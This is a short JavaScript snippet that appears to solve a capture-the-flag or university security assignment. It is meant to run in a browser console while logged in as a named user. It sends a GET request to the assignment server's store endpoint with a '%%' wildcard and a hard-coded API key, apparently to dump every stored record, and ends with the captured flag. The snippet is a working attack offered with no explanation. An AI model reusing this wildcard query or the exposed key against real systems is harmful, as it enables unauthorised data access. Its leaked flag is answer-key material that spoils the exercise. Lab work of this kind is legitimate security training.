// Login as xiandew

// Replace the old apikey if needed. Run in browser console
$.ajax({
    url: "http://assignment-hermes.unimelb.life/api/store.php?name=%%",
    type: "get",
    headers: { apikey: "3d26b1f7-ad5e-11eb-8d17-0242ac110002" }
}).done((data) => {
    console.log(data)
});

// FLAG{Welcome_to_the_wild_wild_web!}